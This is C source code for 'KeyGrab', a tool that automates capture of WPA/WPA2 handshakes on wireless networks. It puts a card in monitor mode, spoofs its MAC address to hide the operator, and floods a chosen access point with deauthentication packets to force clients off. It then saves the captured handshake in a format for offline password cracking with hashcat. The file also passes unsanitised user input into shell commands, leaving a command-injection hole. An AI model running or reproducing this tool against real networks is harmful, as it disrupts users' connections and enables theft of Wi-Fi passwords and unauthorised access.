/***********************************************
*FILENAME:		KeyGrab 
*AUTHOR: 		Ryan Sisco
*REQUIREMENTS:	Macchanger & Aircrack-ng plugins
*DATE CREATED:	Jan 2017
*LAST UPDATE: 	April 2018
*DESCRIPTION:	Intercepts WPA/WPA2 password keys
***********************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>

#define WLAN "wlan0"
#define WMON "wlan0mon" 

char *directory;
char *mac;
int channel;
int root;

void intro();
void clean();
void allocate(int);
void getpermission();
void getmac(char*);
int ismacrandom();
int monmode();
void randomize(char*);
void error();
void reset(char*);
void deauth();
void handler(int);
void organize();


int main() {
	signal(SIGINT, handler);
	getpermission();
	allocate(2000);
	getmac(mac);
	system("clear");
	printf("*-----------------*\n");
	printf("\e[1;31m   K\e[0m");
	printf("\e[1;34m E\e[0m");
	printf("\e[1;36m Y\e[0m");
	printf("\e[1;32m G\e[0m");
	printf("\e[1;35m R\e[0m");
	printf("\e[1;33m A\e[0m");
	printf("\e[1;28m B\e[0m");
	printf("\n");
	printf("*-----------------*\n\n\n");
	if (root == 1) {
		printf("Running as Root: \e[1;32m \tYES \e[0m\n");
	}
	else {
		printf("Running as Root: \e[1;31m \tNO \e[0m\n");
		clean();
		error();
		return 0;
	}
	if (monmode()) {
		printf("Entered Monitor Mode: \e[1;32m \tYES \e[0m\n");
	}
	else {
		printf("Entered Monitor Mode: \e[1;31m \tNO \e[0m\n");
	}
	randomize(WMON);
	if (ismacrandom()) {
		printf("Spoofed MAC: \e[1;32m \t\tYES \e[0m\n");
	}
	else {
		printf("Spoofed MAC: \e[1;31m \t\tNO!!! \e[0m\n");
		clean();
		error();
		return 0;
	}
	sleep(1);
	deauth();
	organize();
	clean();
	return 0;
}



/***********************************************
*FUNCTION:     intro()
*RETURNS:	   nothing
*DESCRIPTION:  prints intro  
***********************************************/
void intro() {
	printf("*-----------------*\n");
	printf("\e[1;31m   K\e[0m");
	printf("\e[1;34m E\e[0m");
	printf("\e[1;36m Y\e[0m");
	printf("\e[1;32m G\e[0m");
	printf("\e[1;35m R\e[0m");
	printf("\e[1;33m A\e[0m");
	printf("\e[1;28m B\e[0m");
	printf("\n");
	printf("*-----------------*\n");
	sleep(2);
}



/***********************************************
*FUNCTION:     clean()
*RETURNS:	   nothing
*DESCRIPTION:  resets MAC, kills wmon, frees mem 
***********************************************/
void clean() {
	printf("--------------\n");
	printf("CLEANING\n");
	reset(WMON);
	char *cmd = (char*) malloc (400 * sizeof(char));
	strcpy(cmd, "sudo airmon-ng stop ");
	strcat(cmd, WMON);
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);
	strcpy(cmd, "sudo service network-manager restart");
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);
	strcpy(cmd, "ifconfig ");
	strcat(cmd, WLAN);
	strcat(cmd, " up");
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);
	free(cmd);
	free(directory);
	free(mac);
	printf("Done!\n");
	printf("Exiting...\n");
}



/***********************************************
*FUNCTION:     allocate()
*RETURNS:	   nothing
*DESCRIPTION:  allocates memmory  
***********************************************/
void allocate(int size) {
	directory = (char*) malloc (size * sizeof(char));
	mac = (char*) malloc (size * sizeof(char));
}



/***********************************************
*FUNCTION:     getpermission()
*RETURNS:	   nothing
*DESCRIPTION:  checks if sudo  
***********************************************/
void getpermission() {
	if (geteuid() != 0) {
		root = 0;
	}
	else {
		root = 1;
	}
}



/***********************************************
*FUNCTION:     randomize()
*RETURNS:	   nothing
*DESCRIPTION:  randomizes mac address  
***********************************************/
void randomize(char name[]) {
	char *cmd = (char*) malloc (400 * sizeof(char));
	strcpy(cmd, "ifconfig ");
	strcat(cmd, name);
	strcat(cmd, " down");
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);	//brings card offline
	strcpy(cmd, "sudo macchanger -a ");
	strcat(cmd, name);
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);	//randomizes mac
	strcpy(cmd, "sudo ifconfig ");
	strcat(cmd, name);
	strcat(cmd, " up");
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);	//brings card back online
	free(cmd);
}



/***********************************************
*FUNCTION:     reset()
*RETURNS:	   nothing
*DESCRIPTION:  resets mac  
***********************************************/
void reset(char name[]) {
	char *cmd = (char*) malloc (400 * sizeof(char));
	strcpy(cmd, "sudo ifconfig ");
	strcat(cmd, name);
	strcat(cmd, " down");
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);	//brings card offline
	strcpy(cmd, "sudo macchanger -p ");
	strcat(cmd, name);
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);	//resets mac address to default
	strcpy(cmd, "sudo ifconfig ");
	strcat(cmd, name);
	strcat(cmd, " up");
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);	//brings card back online
	free(cmd);
}



/***********************************************
*FUNCTION:     getmac()
*RETURNS:	   nothing
*DESCRIPTION:  gets starting mac address  
***********************************************/
void getmac(char* newstr) {
	char data[2000];
	int i;
	//scans for current mac
	FILE *fp = popen("ifconfig -a", "r");
	while (fgets(data, 2000, fp) != NULL) {
		if (strstr(data, "HWaddr")) {
			for (i = 0; i < strlen(data); i++) {
				if ((data[i] == 'H') && (data[i+3] == 'd')) {
					i = i + 7;
					int j = 0;
					while (data[i] != ' ') {
						newstr[j] = data[i];	//pulls current mac
						i++;
						j++;
					}
					newstr[j] = '\0';
				}
			}
		}
	}
	pclose(fp);
}



/***********************************************
*FUNCTION:     ismacrandom()
*RETURNS:	   bool
*DESCRIPTION:  checks current mac vs starting one  
***********************************************/
int ismacrandom() {
	char *test = (char*) malloc (200 * sizeof(char));
	getmac(test);
	if ((strcmp(test, mac)) == 0) {
		free(test);
		return 0;
	}
	free(test);
	return 1;
}



/***********************************************
*FUNCTION:     error()
*RETURNS:	   nothing
*DESCRIPTION:  prints error statement 
***********************************************/
void error() {
	printf("----------------\n");
	printf("     ERROR!   \n");
	printf("This may be due to\n");
	printf("improper configuration\n");
	printf("Please Read Instructions!\n");
	printf("----------------\n");
	exit(1);
}



/***********************************************
*FUNCTION:     monmode()
*RETURNS:	   bool
*DESCRIPTION:  puts card in monmode  
***********************************************/
int monmode() {
	char *cmd = (char*) malloc (400 * sizeof(char));
	strcpy(cmd, "sudo airmon-ng start "); 
	strcat(cmd, WLAN);
	strcat(cmd, " >>/dev/null");
	system(cmd);
	free(cmd);
	return 1;
}



/***********************************************
*FUNCTION:     deauth()
*RETURNS:	   nothing
*DESCRIPTION:  deauths and intercepts handshake  
***********************************************/
void deauth() {
	char *cmd = (char*) malloc (400 * sizeof(char));
	char *choice = (char*) malloc (200 * sizeof(char));
	char *choice2 = (char*) malloc (200 * sizeof(char));
	strcpy(cmd, "sudo airodump-ng ");
	strcat(cmd, WMON);
	system(cmd);	//"sudo airodump-ng [MON MODE]"
	printf("\e[1;34mTARGET BSSID: \e[0m");
	fgets(choice, 200, stdin);
	choice[strlen(choice)-1] = '\0';
	printf("\e[1;34mCHANNEL: \e[0m");
	fgets(choice2, 200, stdin);
	choice2[strlen(choice2)-1] = '\0';
	strcpy(directory, choice);
	strcpy(cmd, "sudo airmon-ng stop ");
	strcat(cmd, WMON);
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);	//"sudo airmon-ng stop [MON MODE]"
	strcpy(cmd, "sudo airmon-ng start ");
	strcat(cmd, WLAN);
	strcat(cmd, " ");
	strcat(cmd, choice2);
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);	//"sudo airmon-ng start [MAN MODE] [CHANNEL]"
	randomize(WMON);
	char data[2000];
	char gnome[2000];
	int i;
	int q = 1;
	sleep(1);	//"gnome-terminal -x sh -c" puts everything in new window
	strcpy(gnome, "gnome-terminal -x sh -c \"sudo airodump-ng -c");
	strcat(gnome, choice2);
	strcat(gnome, " -w Key --bssid ");
	strcat(gnome, choice);
	strcat(gnome, " ");
	strcat(gnome, WMON);
	strcat(gnome, "; bash\"");
	system(gnome);	//"sudo airodump-ng -c[CHANNEL] -w Key --bssid [BSSID]"
	strcpy(cmd, "sudo aireplay-ng -0 0 -a ");
	strcat(cmd, choice);
	strcat(cmd, " ");
	strcat(cmd, WMON);
	system(cmd);
	free(choice2);
	free(choice);
	free(cmd);
}



/***********************************************
*FUNCTION:     handler()
*RETURNS:	   nothing
*DESCRIPTION:  Handles ctrl+c  
***********************************************/
void handler(int job) {
	clean();
	exit(0);
}



/***********************************************
*FUNCTION:     organize()
*RETURNS:	   nothing
*DESCRIPTION:  makes directory, makes hccapx, 
*				moves everything  
***********************************************/
void organize() {
	char *cmd = (char*) malloc (400 * sizeof(char));
	strcpy(cmd, "mkdir ");
	strcat(cmd, directory);
	strcat(cmd, " >>/dev/null");	//background
	system(cmd);
	strcpy(cmd, "./hashcat-utils/cap2hccapx Key-01.cap ");
	strcat(cmd, directory);
	strcat(cmd, "/Key-01.hccapx");
	strcat(cmd, " >>/dev/null");	//background
	system(cmd); 
	strcpy(cmd, "mv Key-01* ./");
	strcat(cmd, directory);
	system(cmd);
	free(cmd);
}
